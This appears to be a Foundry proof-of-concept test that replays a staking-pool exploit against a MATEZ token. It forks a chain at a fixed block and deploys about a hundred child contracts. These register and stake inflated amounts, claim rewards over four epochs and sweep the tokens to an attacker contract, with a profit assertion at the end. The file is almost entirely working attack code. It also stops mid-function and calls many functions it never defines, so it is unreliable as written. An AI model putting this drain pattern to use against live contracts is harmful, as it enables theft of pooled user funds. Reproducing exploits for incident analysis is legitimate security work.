
pragma solidity ^0.8.20;

import {Base, IERC20Like} from "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 44222631;
    uint256 constant TX_TIMESTAMP = 1732248647;
    uint256 constant TX_BLOCK_NUMBER = 44222632;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"), FORK_BLOCK);
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        Harness attack = _deployHarness();
        _prepareProfit(attack);
        _logBalances("Before exploit");
        _executeAttack(attack);
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _deployHarness() internal returns (Harness attack) {
        if (ATTACK_CONTRACT != address(0)) {
            _etchHarness();
            attack = Harness(payable(ATTACK_CONTRACT));
        } else {
            attack = new Harness();
        }
        _etchChildren();
        _bindAttackChild(attack);
    }

    function _prepareProfit(Harness attack) internal {
        _prepareProfit(address(attack), _expectedAttackChild(attack));
    }

    function _expectedAttackChild(Harness attack) internal pure returns (address) {
        attack;
        return Addresses.attack_child_EC06;
    }

    function _executeAttack(Harness attack) internal {
        attack.attack{value: TX_VALUE}();
    }

    function _etchHarness() internal {

        vm.etch(ATTACK_CONTRACT, type(Harness).runtimeCode);
    }

    function _etchChildren() internal {

        vm.etch(Addresses.attack_child, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_CC5D, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_6C91, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_E4CA, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_4C34, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_983E, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_E4C7, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_D3C4, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_4FDB, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_26C2, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_EC06, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_A91E, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_2DBB, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_3EED, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_0822, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_4CD2, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_D53D, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_9F32, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_EB48, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_872D, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_6E85, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_3714, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_A5F4, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_21AE, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_6819, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_5F02, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_14F1, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_D8A7, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_9121, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_D8A5, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_C686, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_61CC, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_28B0, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_4E43, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_1C74, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_519E, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_6AA9, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_DF23, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_1C47, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_6553, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_F68E, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_0F34, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_C0BC, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_82A9, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_3F87, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_27CC, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_5580, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_47AF, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_B28E, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_35C8, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_A62A, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_9795, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_D656, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_8374, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_308B, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_A2BB, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_4DAA, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_9873, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_6047, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_4808, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_B390, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_4874, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_B58B, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_5389, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_4AC2, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_C0FF, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_A8C9, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_BFBB, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_2FC9, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_2824, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_6268, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_6430, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_8FBE, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_E808, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_C6CD, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_02E8, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_2488, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_1334, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_27AA, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_2BEE, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_0CE1, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_44F0, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_0F44, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_D786, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_7553, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_148D, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_300B, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_4E29, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_B6FD, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_A9A5, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_6B57, type(AttackChild).runtimeCode);
        vm.etch(Addresses.A_DE883F_0F34, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_D208, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_93BA, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_F95E, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_9D42, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_A99F, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_EBD3, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_3697, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_8EB5, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_0417, type(AttackChild).runtimeCode);
    }

    function _bindAttackChild(Harness attack) internal {
        attack.bindAttackChildContracts();
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(Addresses.attack_contract, attack, Addresses.MATEZ, "MATEZ", 67492228104191350600);
    }
}

contract Harness {
    AttackChild public attackChild;

    function _ctorBootstrap() internal {
        if (address(attackChild) == address(0)) {
            attackChild = AttackChild(payable(0x10EDb8294d878F06b90a6D32867E5F81002FeC06));
        }
    }

    function deployAttackChildContracts() external returns (address) {
        _ctorBootstrap();
        return address(attackChild);
    }

    function attack() external payable {
        if (address(attackChild) == address(0)) _ctorBootstrap();
        _prepareStakeWave();
    }

    function _prepareStakeWave() internal {
        _snapshotPoolBalance();
        _prepareStakeBatch();
        _runInitialCallback();
        _claimEpochOne();
        _claimEpochTwo();
        _runBatchCallback();
        _claimEpochThree();
        _runBatchCallback2();
        _claimEpochFour();
    }

    function _snapshotPoolBalance() internal view {
        IERC20Like(Addresses.A_6D4432_E3EC).balanceOf(address(this));
    }

    function _prepareStakeBatch() internal {
        _requireChild(address(attackChild));
        AttackChild(payable(address(attackChild)))._prepareAttackChil4();
    }

    function _runInitialCallback() internal {
        _callAttackChild(address(attackChild), abi.encodeWithSelector(bytes4(0xd7bd34bf), uint256(25)));
    }

    function _claimEpochOne() internal {
        AttackChild(payable(address(attackChild))).claim(uint40(1));
    }

    function _claimEpochTwo() internal {
        AttackChild(payable(address(attackChild))).claim(uint40(2));
    }

    function _runBatchCallback() internal {
        _callAttackChild(address(attackChild), abi.encodeWithSelector(bytes4(0xd7bd34bf), uint256(25)));
    }

    function _claimEpochThree() internal {
        AttackChild(payable(address(attackChild))).claim(uint40(3));
    }

    function _runBatchCallback2() internal {
        _callAttackChild(address(attackChild), abi.encodeWithSelector(bytes4(0xd7bd34bf), uint256(50)));
    }

    function _claimEpochFour() internal {
        AttackChild(payable(address(attackChild))).claim(uint40(4));
    }

    receive() external payable {}

    fallback() external payable {
        if (msg.data.length == 0) return;
        if (msg.sig == 0x614c8325) {
            _prepareStakeWave();
            return;
        }
        _entryCb();
    }

    function _entryCb() internal {}

    function bindAttackChildContracts() external {
        attackChild = AttackChild(payable(0x10EDb8294d878F06b90a6D32867E5F81002FeC06));
    }

    function bindAttackChild(address attackChildAddress) external {
        attackChild = AttackChild(payable(attackChildAddress));
    }

    function _requireChild(address child) internal view {
        require(child.code.length != 0, "attack child runtime missing");
    }

    function _callAttackChild(address child, bytes memory callbackData) internal {
        (bool ok,) = child.call(callbackData);
        require(ok, "attack child dispatch failed");
    }

    mapping(bytes4 => uint256) private _callCursor;

    function _nextCall(bytes4 callSig) internal returns (uint256 ordinal) {
        ordinal = _callCursor[callSig];
        _callCursor[callSig] = ordinal + 1;
    }
}

contract AttackChild {
    receive() external payable {}

    function retrieve(address recipient) external payable {
        recipient;
        uint256 callbackIndex = _nextCall(0x0a79309b);
        if (callbackIndex == 0) {
            _sweepMatez();
            return;
        }
        if (callbackIndex == 1) {
            _sweepMatez2();
            return;
        }
        if (callbackIndex == 2) {
            _sweepMatez3();
            return;
        }
        if (callbackIndex == 3) {
            _sweepMatez4();
            return;
        }
        _sweepMatez();
        return;
    }

    function claim(uint40 amount) external payable {
        uint256 claimEpoch = uint256(amount);
        if (claimEpoch == 1) {
            _claimEpochOne();
            return;
        }
        if (claimEpoch == 2) {
            _claimEpochTwo();
            return;
        }
        if (claimEpoch == 3) {
            _claimEpochThree();
            return;
        }
        if (claimEpoch == 4) {
            _claimEpochFour();
            return;
        }
        _claimEpochOne();
        return;
    }

    fallback() external payable {
        if (msg.data.length == 0) return;
        if (msg.sig == 0xd7bd34bf) {
            uint256 stakeBatchSize;
            assembly {
                stakeBatchSize := calldataload(4)
            }
            if (stakeBatchSize == 50) {
                _prepareStakeWave();
                return;
            }
            uint256 callbackIndex = _nextCall(0xd7bd34bf);
            if (callbackIndex == 0) {
                _prepareStakeBatch();
                return;
            }
            if (callbackIndex == 1) {
                _prepareStakeBatch2();
                return;
            }
            _prepareStakeBatch();
            return;
        }
        _entryCb();
    }

    function deployAttackChildContracts2() external payable {
        _prepareStakeBatch();
        return;
    }

    function attackChildCb8() external payable {
        _claimEpochOne();
        return;
    }

    function attackChildCb() external payable {
        _sweepMatez();
        return;
    }

    function attackChildCb6() external payable {
        _claimEpochTwo();
        return;
    }

    function attackChildCb2() external payable {
        _sweepMatez2();
        return;
    }

    function deployAttackChildContracts3() external payable {
        _prepareStakeBatch2();
        return;
    }

    function attackChildCb5() external payable {
        _claimEpochThree();
        return;
    }

    function attackChildCb3() external payable {
        _sweepMatez3();
        return;
    }

    function deployAttackChildContracts() external payable {
        _prepareStakeWave();
        return;
    }

    function attackChildCb7() external payable {
        _claimEpochFour();
        return;
    }

    function attackChildCb4() external payable {
        _sweepMatez4();
        return;
    }

    function _entryCb() internal {}

    mapping(bytes4 => uint256) private _callCursor;

    function _nextCall(bytes4 callSig) internal returns (uint256 ordinal) {
        ordinal = _callCursor[callSig];
        _callCursor[callSig] = ordinal + 1;
    }

    function _requireChild(address child) internal view {
        require(child.code.length != 0, "attack child runtime missing");
    }

    function _prepareAttackChild() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChild2() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChild3() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChild4() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChild5() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChild6() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChild7() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChild8() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChild9() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil3() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _sweepMatez() internal {
        uint256 childMatezBalance = IERC20Like(Addresses.MATEZ).balanceOf(address(this));
        IERC20Like(Addresses.MATEZ).transfer(Addresses.attack_contract, childMatezBalance);
    }

    function _sweepMatez2() internal {
        uint256 childMatezBalance = IERC20Like(Addresses.MATEZ).balanceOf(address(this));
        IERC20Like(Addresses.MATEZ).transfer(Addresses.attack_contract, childMatezBalance);
    }

    function _sweepMatez3() internal {
        uint256 childMatezBalance = IERC20Like(Addresses.MATEZ).balanceOf(address(this));
        IERC20Like(Addresses.MATEZ).transfer(Addresses.attack_contract, childMatezBalance);
    }

    function _sweepMatez4() internal {
        uint256 childMatezBalance = IERC20Like(Addresses.MATEZ).balanceOf(address(this));
        IERC20Like(Addresses.MATEZ).transfer(Addresses.attack_contract, childMatezBalance);
    }

    function _claimEpochThree() internal {
        IStakingPool(Addresses.staking_pool).claim(uint40(3), uint40(3), 0);
        _sweepMatez();
    }

    function _claimEpochTwo() internal {
        IStakingPool(Addresses.staking_pool).claim(uint40(3), uint40(2), 0);
        _sweepMatez();
    }

    function _claimEpochFour() internal {
        IStakingPool(Addresses.staking_pool).claim(uint40(3), uint40(4), 0);
        _sweepMatez();
    }

    function _claimEpochOne() internal {
        IStakingPool(Addresses.staking_pool).claim(uint40(3), uint40(1), 0);
        _sweepMatez();
    }

    function _prepareStakeWave() internal {
        _stakeGroup28();
        _stakeGroup29();
        _stakeGroup30();
        _stakeGroup31();
        _stakeGroup32();
        _stakeGroup33();
        _stakeGroupCo();
        _stakeGroup2();
        _stakeGroup3();
        _stakeGroup4();
        _stakeGroup5();
        _stakeGroup6();
        _stakeGroup7();
        _stakeGroup8();
        _stakeGroup9();
        _stakeGroup10();
    }

    function _stakeGroup28() internal {
        _requireChild(Addresses.attack_child_A62A);
        AttackChild(payable(Addresses.attack_child_A62A))._prepareAttackChil44();
        _requireChild(Addresses.attack_child_EB48);
        AttackChild(payable(Addresses.attack_child_EB48))._prepareAttackChil12();
    }

    function _stakeGroup29() internal {
        _requireChild(Addresses.attack_child_3697);
        AttackChild(payable(Addresses.attack_child_3697))._prepareAttackChil92();
        _requireChild(Addresses.attack_child_D3C4);
        AttackChild(payable(Addresses.attack_child_D3C4))._prepareAttackChild8();
        _requireChild(Addresses.attack_child_93BA);
        AttackChild(payable(Addresses.attack_child_93BA))._prepareAttackChil87();
    }

    function _stakeGroup30() internal {
        _requireChild(Addresses.attack_child_9795);
        AttackChild(payable(Addresses.attack_child_9795))._prepareAttackChil45();
        _requireChild(Addresses.attack_child_C686);
        AttackChild(payable(Addresses.attack_child_C686))._prepareAttackChil24();
        _requireChild(Addresses.attack_child_F95E);
        AttackChild(payable(Addresses.attack_child_F95E))._prepareAttackChil88();
    }

    function _stakeGroup31() internal {
        _requireChild(Addresses.attack_child_308B);
        AttackChild(payable(Addresses.attack_child_308B))._prepareAttackChil48();
        _requireChild(Addresses.attack_child_2DBB);
        AttackChild(payable(Addresses.attack_child_2DBB))._prepareAttackChil6();
        _requireChild(Addresses.attack_child_3EED);
        AttackChild(payable(Addresses.attack_child_3EED))._prepareAttackChil7();
        _requireChild(Addresses.attack_child_7553);
        AttackChild(payable(Addresses.attack_child_7553))._prepareAttackChil78();
    }

    function _stakeGroup32() internal {
        _requireChild(Addresses.attack_child_5580);
        AttackChild(payable(Addresses.attack_child_5580))._prepareAttackChil40();
        _requireChild(Addresses.attack_child_2824);
        AttackChild(payable(Addresses.attack_child_2824))._prepareAttackChil63();
        _requireChild(Addresses.attack_child_6553);
        AttackChild(payable(Addresses.attack_child_6553))._prepareAttackChil33();
    }

    function _stakeGroup33() internal {
        _requireChild(Addresses.attack_child_300B);
        AttackChild(payable(Addresses.attack_child_300B))._prepareAttackChil80();
        _requireChild(Addresses.attack_child_47AF);
        AttackChild(payable(Addresses.attack_child_47AF))._prepareAttackChil41();
        _requireChild(Addresses.attack_child_6E85);
        AttackChild(payable(Addresses.attack_child_6E85))._prepareAttackChil14();
    }

    function _stakeGroupCo() internal {
        _requireChild(Addresses.attack_child_3714);
        AttackChild(payable(Addresses.attack_child_3714))._prepareAttackChil15();
        _requireChild(Addresses.attack_child_C0FF);
        AttackChild(payable(Addresses.attack_child_C0FF))._prepareAttackChil59();
        _requireChild(Addresses.attack_child_B6FD);
        AttackChild(payable(Addresses.attack_child_B6FD))._prepareAttackChil82();
        _requireChild(Addresses.attack_child_D8A7);
        AttackChild(payable(Addresses.attack_child_D8A7))._prepareAttackChil21();
    }

    function _stakeGroup2() internal {
        _requireChild(Addresses.attack_child_8EB5);
        AttackChild(payable(Addresses.attack_child_8EB5))._prepareAttackChild1();
        _requireChild(Addresses.attack_child_4FDB);
        AttackChild(payable(Addresses.attack_child_4FDB))._prepareAttackChild9();
        _requireChild(Addresses.attack_child_02E8);
        AttackChild(payable(Addresses.attack_child_02E8))._prepareAttackChil69();
    }

    function _stakeGroup3() internal {
        _requireChild(Addresses.attack_child_2488);
        AttackChild(payable(Addresses.attack_child_2488))._prepareAttackChil70();
        _requireChild(Addresses.attack_child_E4CA);
        AttackChild(payable(Addresses.attack_child_E4CA))._prepareAttackChild4();
        _requireChild(Addresses.attack_child_B28E);
        AttackChild(payable(Addresses.attack_child_B28E))._prepareAttackChil42();
    }

    function _stakeGroup4() internal {
        _requireChild(Addresses.attack_child_28B0);
        AttackChild(payable(Addresses.attack_child_28B0))._prepareAttackChil26();
        _requireChild(Addresses.attack_child_F68E);
        AttackChild(payable(Addresses.attack_child_F68E))._prepareAttackChil34();
        _requireChild(Addresses.attack_child);
        AttackChild(payable(Addresses.attack_child))._prepareAttackChild();
        _requireChild(Addresses.attack_child_519E);
        AttackChild(payable(Addresses.attack_child_519E))._prepareAttackChil29();
    }

    function _stakeGroup5() internal {
        _requireChild(Addresses.A_DE883F_0F34);
        AttackChild(payable(Addresses.A_DE883F_0F34))._prepareAttackChil85();
        _requireChild(Addresses.attack_child_27AA);
        AttackChild(payable(Addresses.attack_child_27AA))._prepareAttackChil72();
        _requireChild(Addresses.attack_child_8374);
        AttackChild(payable(Addresses.attack_child_8374))._prepareAttackChil47();
    }

    function _stakeGroup6() internal {
        _requireChild(Addresses.attack_child_6C91);
        AttackChild(payable(Addresses.attack_child_6C91))._prepareAttackChild3();
        _requireChild(Addresses.attack_child_1334);
        AttackChild(payable(Addresses.attack_child_1334))._prepareAttackChil71();
        _requireChild(Addresses.attack_child_21AE);
        AttackChild(payable(Addresses.attack_child_21AE))._prepareAttackChil17();
    }

    function _stakeGroup7() internal {
        _requireChild(Addresses.attack_child_8FBE);
        AttackChild(payable(Addresses.attack_child_8FBE))._prepareAttackChil66();
        _requireChild(Addresses.attack_child_D786);
        AttackChild(payable(Addresses.attack_child_D786))._prepareAttackChil77();
        _requireChild(Addresses.attack_child_0822);
        AttackChild(payable(Addresses.attack_child_0822))._prepareAttackChil8();
        _requireChild(Addresses.attack_child_9873);
        AttackChild(payable(Addresses.attack_child_9873))._prepareAttackChil51();
    }

    function _stakeGroup8() internal {
        _requireChild(Addresses.attack_child_CC5D);
        AttackChild(payable(Addresses.attack_child_CC5D))._prepareAttackChild2();
        _requireChild(Addresses.attack_child_C6CD);
        AttackChild(payable(Addresses.attack_child_C6CD))._prepareAttackChil68();
        _requireChild(Addresses.attack_child_4C34);
        AttackChild(payable(Addresses.attack_child_4C34))._prepareAttackChild5();
    }

    function _stakeGroup9() internal {
        _requireChild(Addresses.attack_child_9D42);
        AttackChild(payable(Addresses.attack_child_9D42))._prepareAttackChil89();
        _requireChild(Addresses.attack_child_872D);
        AttackChild(payable(Addresses.attack_child_872D))._prepareAttackChil13();
        _requireChild(Addresses.attack_child_DF23);
        AttackChild(payable(Addresses.attack_child_DF23))._prepareAttackChil31();
    }

    function _stakeGroup10() internal {
        _requireChild(Addresses.attack_child_4CD2);
        AttackChild(payable(Addresses.attack_child_4CD2))._prepareAttackChil9();
        _requireChild(Addresses.attack_child_5389);
        AttackChild(payable(Addresses.attack_child_5389))._prepareAttackChil57();
    }

    function _prepareStakeBatch() internal {
        _stakeGroup11();
        _stakeGroup12();
        _stakeGroup13();
        _stakeGroup14();
        _stakeGroup15();
        _stakeGroup16();
        _stakeGroup17();
        _stakeGroup18();
    }

    function _stakeGroup11() internal {
        _requireChild(Addresses.attack_child_D8A5);
        AttackChild(payable(Addresses.attack_child_D8A5))._prepareAttackChil23();
        _requireChild(Addresses.attack_child_0F34);
        AttackChild(payable(Addresses.attack_child_0F34))._prepareAttackChil35();
    }

    function _stakeGroup12() internal {
        _requireChild(Addresses.attack_child_B390);
        AttackChild(payable(Addresses.attack_child_B390))._prepareAttackChil54();
        _requireChild(Addresses.attack_child_983E);
        AttackChild(payable(Addresses.attack_child_983E))._prepareAttackChild6();
        _requireChild(Addresses.attack_child_27CC);
        AttackChild(payable(Addresses.attack_child_27CC))._prepareAttackChil39();
    }

    function _stakeGroup13() internal {
        _requireChild(Addresses.attack_child_6268);
        AttackChild(payable(Addresses.attack_child_6268))._prepareAttackChil64();
        _requireChild(Addresses.attack_child_0F44);
        AttackChild(payable(Addresses.attack_child_0F44))._prepareAttackChil76();
        _requireChild(Addresses.attack_child_E4C7);
        AttackChild(payable(Addresses.attack_child_E4C7))._prepareAttackChild7();
    }

    function _stakeGroup14() internal {
        _requireChild(Addresses.attack_child_6B57);
        AttackChild(payable(Addresses.attack_child_6B57))._prepareAttackChil84();
        _requireChild(Addresses.attack_child_A9A5);
        AttackChild(payable(Addresses.attack_child_A9A5))._prepareAttackChil83();
        _requireChild(Addresses.attack_child_C0BC);
        AttackChild(payable(Addresses.attack_child_C0BC))._prepareAttackChil36();
        _requireChild(Addresses.attack_child_4E29);
        AttackChild(payable(Addresses.attack_child_4E29))._prepareAttackChil81();
    }

    function _stakeGroup15() internal {
        _requireChild(Addresses.attack_child_A2BB);
        AttackChild(payable(Addresses.attack_child_A2BB))._prepareAttackChil49();
        _requireChild(Addresses.attack_child_4874);
        AttackChild(payable(Addresses.attack_child_4874))._prepareAttackChil55();
        _requireChild(Addresses.attack_child_4DAA);
        AttackChild(payable(Addresses.attack_child_4DAA))._prepareAttackChil50();
    }

    function _stakeGroup16() internal {
        _requireChild(Addresses.attack_child_9F32);
        AttackChild(payable(Addresses.attack_child_9F32))._prepareAttackChil11();
        _requireChild(Addresses.attack_child_4808);
        AttackChild(payable(Addresses.attack_child_4808))._prepareAttackChil53();
        _requireChild(Addresses.attack_child_1C74);
        AttackChild(payable(Addresses.attack_child_1C74))._prepareAttackChil28();
    }

    function _stakeGroup17() internal {
        _requireChild(Addresses.attack_child_0CE1);
        AttackChild(payable(Addresses.attack_child_0CE1))._prepareAttackChil74();
        _requireChild(Addresses.attack_child_6430);
        AttackChild(payable(Addresses.attack_child_6430))._prepareAttackChil65();
        _requireChild(Addresses.attack_child_5F02);
        AttackChild(payable(Addresses.attack_child_5F02))._prepareAttackChil19();
        _requireChild(Addresses.attack_child_E808);
        AttackChild(payable(Addresses.attack_child_E808))._prepareAttackChil67();
    }

    function _stakeGroup18() internal {
        _requireChild(Addresses.attack_child_148D);
        AttackChild(payable(Addresses.attack_child_148D))._prepareAttackChil79();
        _requireChild(Addresses.attack_child_2FC9);
        AttackChild(payable(Addresses.attack_child_2FC9))._prepareAttackChil62();
        _requireChild(Addresses.attack_child_A99F);
        AttackChild(payable(Addresses.attack_child_A99F))._prepareAttackChil90();
    }

    function _prepareStakeBatch2() internal {
        _stakeGroup19();
        _stakeGroup20();
        _stakeGroup21();
        _stakeGroup22();
        _stakeGroup23();
        _stakeGroup24();
        _stakeGroup25();
        _stakeGroup26();
    }

    function _stakeGroup19() internal {
        _requireChild(Addresses.attack_child_61CC);
        AttackChild(payable(Addresses.attack_child_61CC))._prepareAttackChil25();
        _requireChild(Addresses.attack_child_4E43);
        AttackChild(payable(Addresses.attack_child_4E43))._prepareAttackChil27();
    }

    function _stakeGroup20() internal {
        _requireChild(Addresses.attack_child_6819);
        AttackChild(payable(Addresses.attack_child_6819))._prepareAttackChil18();
        _requireChild(Addresses.attack_child_BFBB);
        AttackChild(payable(Addresses.attack_child_BFBB))._prepareAttackChil61();
        _requireChild(Addresses.attack_child_0417);
        AttackChild(payable(Addresses.attack_child_0417))._prepareAttackChil2();
    }

    function _stakeGroup21() internal {
        _requireChild(Addresses.attack_child_A5F4);
        AttackChild(payable(Addresses.attack_child_A5F4))._prepareAttackChil16();
        _requireChild(Addresses.attack_child_9121);
        AttackChild(payable(Addresses.attack_child_9121))._prepareAttackChil22();
        _requireChild(Addresses.attack_child_EBD3);
        AttackChild(payable(Addresses.attack_child_EBD3))._prepareAttackChil91();
    }

    function _stakeGroup22() internal {
        _requireChild(Addresses.attack_child_14F1);
        AttackChild(payable(Addresses.attack_child_14F1))._prepareAttackChil20();
        _requireChild(Addresses.attack_child_D53D);
        AttackChild(payable(Addresses.attack_child_D53D))._prepareAttackChil10();
        _requireChild(Addresses.attack_child_4AC2);
        AttackChild(payable(Addresses.attack_child_4AC2))._prepareAttackChil58();
        _requireChild(Addresses.attack_child_35C8);
        AttackChild(payable(Addresses.attack_child_35C8))._prepareAttackChil43();
    }

    function _stakeGroup23() internal {
        _requireChild(Addresses.attack_child_D208);
        AttackChild(payable(Addresses.attack_child_D208))._prepareAttackChil86();
        _requireChild(Addresses.attack_child_D656);
        AttackChild(payable(Addresses.attack_child_D656))._prepareAttackChil46();
        _requireChild(Addresses.attack_child_6AA9);
        AttackChild(payable(Addresses.attack_child_6AA9))._prepareAttackChil30();
    }

    function _stakeGroup24() internal {
        _requireChild(Addresses.attack_child_2BEE);
        AttackChild(payable(Addresses.attack_child_2BEE))._prepareAttackChil73();
        _requireChild(Addresses.attack_child_44F0);
        AttackChild(payable(Addresses.attack_child_44F0))._prepareAttackChil75();
